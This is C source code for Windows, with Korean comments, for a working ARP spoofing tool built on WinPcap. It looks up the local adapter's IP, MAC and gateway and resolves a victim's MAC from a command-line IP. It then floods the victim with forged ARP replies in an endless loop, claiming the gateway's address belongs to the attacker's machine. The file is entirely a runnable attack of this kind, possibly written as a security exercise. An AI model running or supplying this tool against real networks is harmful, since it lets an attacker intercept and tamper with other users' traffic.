#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#include "pcap.h"
#include <stdio.h>
#include <tchar.h>
#include <stdlib.h>
#include <windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <IPHlpApi.h>

#define ETH_HDRLEN 14      // Ethernet header length
#define ARP_HDRLEN 28      // ARP header length

#define ARPHRD_ETHER 1
#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2

#define ETHER_ADDR_LEN 6

typedef struct mac_address {
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
	u_char byte5;
	u_char byte6;
}mac;

typedef struct ether_header {
	unsigned char ether_dhost[ETHER_ADDR_LEN];
	unsigned char ether_shost[ETHER_ADDR_LEN];
	unsigned short ether_type;
}ETHER_HDR;

#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806

typedef struct ip_address {
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;

typedef struct arp_header {
	u_int16_t htype;
	u_int16_t ptype;
	u_int8_t hlen;
	u_int8_t plen;
	u_int16_t opcode;
	u_int8_t sender_mac[6];
	u_int8_t sender_ip[4];
	u_int8_t target_mac[6];
	u_int8_t target_ip[4];
}ARP_HDR;

typedef struct ip_header {
	u_char ver_ihl;
	u_char tos;
	u_short tlen; 
	u_short identification; 
	u_short flags_fo;
	u_char ttl;
	u_char proto;
	u_short crc;
	ip_address saddr;    
	ip_address daddr;
	u_int op_pad; 
}IP_HDR;



int main(int argc, char *argv[])
{
	pcap_t* pkt;
	struct pcap_pkthdr *pkt_header;
	const u_char *pkt_data;
	pcap_if_t *dev;
	int res;

	char errbuf[PCAP_ERRBUF_SIZE];
	const char* target_ip = argv[1];

	// Local IP Address, Local MAC Address, Gateway를 얻어온다.  
	char *Myip = (char*)malloc(16);
	char *Gateway = (char*)malloc(16);
	char *Mymac = (char*)malloc(17);
	u_int8_t byteMAC[8];
	unsigned int lntMyip;
	u_int8_t target_mac[8];
	unsigned int IntGateip;

	PIP_ADAPTER_INFO AdapterInfo;	// 어뎁터가 가지고 있는 정보를 저장
	PIP_ADAPTER_INFO pAdapter = NULL;
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	DWORD dwRetVal = 0;

	/*
	if (argc < 2) {
		fprintf(stderr, "Usage : send_arp <victim ip>\n");
		return -1;
	}*/
	
	unsigned int IntMytarget = (unsigned int)inet_addr(target_ip);

	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));

	if (AdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}

	if (GetAdaptersInfo(AdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
		if (AdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(AdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = AdapterInfo;
	}

	sprintf(Myip, "%s", pAdapter->IpAddressList.IpAddress.String);
	sprintf(Gateway, "%s", pAdapter->GatewayList.IpAddress.String);
	sprintf(Mymac, "%02X:%02X:%02X:%02X:%02X:%02X",
		AdapterInfo->Address[0], AdapterInfo->Address[1],
		AdapterInfo->Address[2], AdapterInfo->Address[3],
		AdapterInfo->Address[4], AdapterInfo->Address[5]);
	memcpy(byteMAC, AdapterInfo->Address, sizeof(byteMAC));

	printf("IP address: \t%s\n", Myip);
	printf("Gateway: \t%s\n", Gateway);
	printf("MAC: \t%s\n", Mymac);
	free(AdapterInfo);

	lntMyip = (unsigned int)inet_addr(Myip);
	IntGateip = (unsigned int)inet_addr(Gateway);

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &dev, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}

	printf("%s\n", dev->name);

	if ((pkt = pcap_open(dev->name,          // name of the device
		65536,            // portion of the packet to capture
						  // 65536 guarantees that the whole packet will be captured on all the link layers
		PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
		1000,             // read timeout
		NULL,             // authentication on the remote machine
		errbuf            // error buffer
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", dev->name);
		/* Free the device list */
		pcap_freealldevs(dev);
		return -1;
	}

	printf("\nlistening on %s...\n", dev->description);

	u_char packet[ETH_HDRLEN + ARP_HDRLEN];

	ETHER_HDR *ether = (ETHER_HDR*)packet;
	memset(ether->ether_dhost, 0xFF, sizeof(ether->ether_dhost));
	memcpy(ether->ether_shost, byteMAC, sizeof(ether->ether_shost));
	ether->ether_type = htons(ETHERTYPE_ARP);

	ARP_HDR *arp = (ARP_HDR*)(packet + ETH_HDRLEN);
	arp->htype = htons(ARPHRD_ETHER);
	arp->ptype = htons(ETHERTYPE_IP);
	arp->hlen = sizeof(mac);
	arp->plen = sizeof(ip_address);
	arp->opcode = htons(ARP_OP_REQUEST);
	memcpy(arp->sender_mac, byteMAC, sizeof(arp->sender_mac));
	*(unsigned int*)(arp->sender_ip) = lntMyip;
	memset(arp->target_mac, 0x00, sizeof(arp->target_mac));
	*(unsigned int*)(arp->target_ip) = (unsigned int)inet_addr(target_ip);
	
	int temp = 50;
	while (temp) {
		if (pcap_sendpacket(pkt, packet, sizeof(packet)) != 0) {
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pkt));
			return -1;
		}
		printf("get mac send packet!!\n");
		temp--;
	}

	/* 상대방의 reply 패킷을 가져와서 mac address 획득하기 */
	
	while ((res = pcap_next_ex(pkt, &pkt_header, &pkt_data)) >= 0) {
		if (res == 0)
			continue;

		ETHER_HDR *chkarp = (ETHER_HDR*)pkt_data;

		if (ntohs(chkarp->ether_type) != ETHERTYPE_ARP) continue;
		ARP_HDR * chkpkt = (ARP_HDR*)(pkt_data + ETH_HDRLEN);

		if (ntohs(chkpkt->opcode) != ARP_OP_REPLY) continue;

		if ((*(unsigned int*)chkpkt->sender_ip) == IntMytarget) {
			memcpy(target_mac, chkpkt->sender_mac, sizeof(target_mac));
			break;
		}
	}

	/* 나를 gateway라고 속이는 arp reply 패킷 전송 */

	u_char poison_pkt[ETH_HDRLEN + ARP_HDRLEN];

	ETHER_HDR *ps_eth = (ETHER_HDR*)poison_pkt;
	memcpy(ps_eth->ether_dhost, target_mac, sizeof(ps_eth->ether_dhost)); // 도착지는 target mac
	memcpy(ps_eth->ether_shost, byteMAC, sizeof(ps_eth->ether_shost));	// 출발지는 byte mac
	ps_eth->ether_type = htons(ETHERTYPE_ARP);	// 보내는 패킷은 arp 패킷

	ARP_HDR *ps_arp = (ARP_HDR*)(poison_pkt + ETH_HDRLEN);
	ps_arp->htype = htons(ARPHRD_ETHER);
	ps_arp->ptype = htons(ETHERTYPE_IP);
	ps_arp->hlen = sizeof(mac);
	ps_arp->plen = sizeof(ip_address);
	ps_arp->opcode = htons(ARP_OP_REPLY);
	memcpy(ps_arp->sender_mac, byteMAC, sizeof(ps_arp->sender_mac));		// gateway의 맥은 내 mac이야!
	*(unsigned int*)(ps_arp->sender_ip) = IntGateip;		//gateway ip로 속인다!!
	memcpy(ps_arp->target_mac, target_mac, sizeof(ps_arp->target_mac));	// 상대방에게 응답! 
	*(unsigned int*)(ps_arp->target_ip) = (unsigned int)inet_addr(target_ip);

	while (1) {
		if (pcap_sendpacket(pkt, poison_pkt, sizeof(poison_pkt)) != 0) {
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pkt));
			return -1;
		}
		printf("send poison packet!!\n");
		Sleep(100);
	}

	pcap_freealldevs(dev);

	free(Myip);
	free(Gateway);
	free(Mymac);

	return 0;
}